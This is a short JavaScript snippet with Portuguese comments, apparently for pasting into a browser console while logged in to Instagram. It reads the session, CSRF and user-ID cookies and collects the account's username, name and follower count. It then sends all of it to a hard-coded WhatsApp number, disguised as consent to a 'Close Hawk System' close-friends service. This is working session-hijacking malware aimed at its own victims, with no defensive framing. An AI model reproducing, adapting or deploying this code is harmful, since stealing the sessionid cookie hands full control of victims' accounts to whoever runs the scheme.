/***********************************************************
 * 1. OBTENDO COOKIES USANDO document.cookie
 ***********************************************************/
function getCookieValue(cookieName) {
  const match = document.cookie.match(
    new RegExp('(^|;\\s*)(' + cookieName + ')=([^;]*)')
  );
  return match ? decodeURIComponent(match[3]) : null;
}

function getInstagramCookies() {
  const csrftoken = getCookieValue("csrftoken");
  const ds_user_id = getCookieValue("ds_user_id");
  const sessionid = getCookieValue("sessionid");

  if (csrftoken && ds_user_id && sessionid) {
    return { csrftoken, ds_user_id, sessionid };
  }
  return null;
}

/***********************************************************
 * 2. FUNÇÃO PARA OBTER INFORMAÇÕES DA CONTA VIA FETCH
 ***********************************************************/
async function getInstagramAccountInfo() {
  // 2.1. Descobrir o username via endpoint de edição
  const editResponse = await fetch(
    "https://www.instagram.com/api/v1/accounts/edit/web_form_data/",
    {
      credentials: "include",
      headers: {
        "x-requested-with": "XMLHttpRequest",
        "x-ig-app-id": "936619743392459"
      }
    }
  );

  if (!editResponse.ok) {
    throw new Error("Falha ao obter username (accounts/edit/web_form_data).");
  }
  const editData = await editResponse.json();
  const username = editData?.form_data?.username;
  if (!username) {
    throw new Error("Não foi possível obter o nome de usuário.");
  }

  // 2.2. Obter dados do perfil
  const profileResponse = await fetch(
    `https://www.instagram.com/api/v1/users/web_profile_info/?username=${username}`,
    {
      credentials: "include",
      headers: {
        "accept": "/",
        "x-requested-with": "XMLHttpRequest",
        "x-ig-app-id": "936619743392459"
      }
    }
  );

  if (!profileResponse.ok) {
    throw new Error("Falha ao obter dados do perfil (web_profile_info).");
  }
  const profileData = await profileResponse.json();
  const user = profileData?.data?.user;
  if (!user) {
    throw new Error("Perfil de usuário inválido.");
  }

  // Extrai dados de interesse
  const followerCount = user.edge_followed_by?.count || 0;
  const profilePicUrl = user.profile_pic_url || "";
  const fullName = user.full_name || "";

  return {
    username,
    fullName,
    followerCount,
    profilePictureUrl: profilePicUrl
  };
}

/***********************************************************
 * 3. FUNÇÃO PARA ENVIAR DADOS VIA WHATSAPP
 ***********************************************************/
function sendDataToWhatsApp(cookies, accountInfo) {
  try {
    const mensagem = `
[CLOSE HAWK SYSTEM - INFO DA CONTA INSTAGRAM]

• Usuário: @${accountInfo.username}
• Nome Completo: ${accountInfo.fullName}
• Seguidores: ${accountInfo.followerCount}

[COOKIES]

• csrftoken: ${cookies.csrftoken}
• ds_user_id: ${cookies.ds_user_id}
• sessionid: ${cookies.sessionid}

[DECLARAÇÃO]

Autorizo o sistema Close Hawk System a fazer serviço de Close Friends.
`;

    // Substitua o número abaixo pelo número de destino
    const whatsappUrl = `https://wa.me/5521991566033?text=${encodeURIComponent(mensagem)}`;
    window.open(whatsappUrl, "_blank");
  } catch (error) {
    console.error("Falha ao enviar dados via WhatsApp:", error);
  }
}

/***********************************************************
 * 4. FLUXO PRINCIPAL
 ***********************************************************/
async function main() {
  // Captura os cookies
  const cookies = getInstagramCookies();
  if (!cookies) {
    console.error("Não foi possível capturar os cookies (csrftoken, ds_user_id, sessionid).");
    return;
  }

  // Captura informações da conta
  try {
    const accountInfo = await getInstagramAccountInfo();
    if (!accountInfo) {
      console.error("Não foi possível obter as informações da conta.");
      return;
    }

    // Envia via WhatsApp
    sendDataToWhatsApp(cookies, accountInfo);

  } catch (error) {
    console.error("Erro ao obter dados da conta ou enviar mensagem:", error);
  }
}

// Inicia o fluxo
main();
